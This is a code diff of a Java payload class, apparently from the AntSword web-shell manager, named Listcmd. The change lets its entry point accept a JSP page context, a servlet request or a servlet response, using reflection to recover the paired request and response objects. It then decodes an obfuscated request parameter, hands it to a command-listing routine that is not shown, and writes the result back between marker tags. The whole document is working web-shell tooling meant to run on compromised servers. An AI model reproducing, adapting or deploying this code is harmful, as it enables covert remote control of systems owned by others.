@@ -1,19 +1,49 @@
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
 import javax.servlet.jsp.PageContext;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.lang.reflect.Field;
 
 public class Listcmd {
+    public HttpServletRequest request = null;
+    public HttpServletResponse response = null;
     public String encoder;
     public String cs;
     public String randomPrefix;
 
     @Override
     public boolean equals(Object obj) {
-        PageContext page = (PageContext) obj;
-        ServletRequest request = page.getRequest();
-        ServletResponse response = page.getResponse();
+        if (obj instanceof PageContext) {
+            PageContext page = (PageContext) obj;
+            request = (HttpServletRequest) page.getRequest();
+            response = (HttpServletResponse) page.getResponse();
+        } else if (obj instanceof HttpServletRequest) {
+            request = (HttpServletRequest) obj;
+            try {
+                Field req = request.getClass().getDeclaredField("request");
+                req.setAccessible(true);
+                HttpServletRequest request2 = (HttpServletRequest) req.get(request);
+                Field resp = request2.getClass().getDeclaredField("response");
+                resp.setAccessible(true);
+                response = (HttpServletResponse) resp.get(request2);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+
+        } else if (obj instanceof HttpServletResponse) {
+            response = (HttpServletResponse) obj;
+            try {
+                Field resp = response.getClass().getDeclaredField("response");
+                resp.setAccessible(true);
+                HttpServletResponse response2 = (HttpServletResponse) resp.get(response);
+                Field req = response2.getClass().getDeclaredField("request");
+                req.setAccessible(true);
+                request = (HttpServletRequest) req.get(response2);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
         randomPrefix = "antswordrandomPrefix";
         encoder = "base64";
         cs = "antswordCharset";
@@ -26,24 +56,24 @@ public class Listcmd {
             response.setContentType("text/html");
             request.setCharacterEncoding(cs);
             response.setCharacterEncoding(cs);
-            String z1 = EC(decode(request.getParameter(varkey1) + "", encoder, cs), encoder, cs);
+            String z1 = EC(decode(request.getParameter(varkey1) + ""));
             output.append(tag_s);
             sb.append(ListcmdCode(z1));
             output.append(sb.toString());
             output.append(tag_e);
-            page.getOut().print(output.toString());
+            response.getWriter().print(output.toString());
         } catch (Exception e) {
             sb.append("ERROR" + ":// " + e.toString());
         }
         return true;
     }
 
-    String EC(String s, String encoder, String cs) throws Exception {
-        if (encoder.equals("hex") || encoder == "hex") return s;
+    String EC(String s ) throws Exception {
+        if (encoder.equals("hex") ) return s;
         return new String(s.getBytes(), cs);
     }
 
-    String decode(String str, String encode, String cs) throws Exception {
+    String decode(String str ) throws Exception {
         int prefixlen = 0;
         try {
             prefixlen = Integer.parseInt(randomPrefix);
@@ -51,8 +81,8 @@ public class Listcmd {
         } catch (Exception e) {
             prefixlen = 0;
         }
-        if (encode.equals("hex") || encode == "hex") {
-            if (str == "null" || str.equals("null")) {
+        if (encoder.equals("hex")) {
+            if (str == null || str.equals("")) {
                 return "";
             }
             String hexString = "0123456789ABCDEF";
@@ -64,7 +94,7 @@ public class Listcmd {
                 baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
             }
             return baos.toString("UTF-8");
-        } else if (encode.equals("base64") || encode == "base64") {
+        } else if (encoder.equals("base64")) {
             byte[] bt = null;
             String version = System.getProperty("java.version");
             if (version.compareTo("1.9") >= 0) {
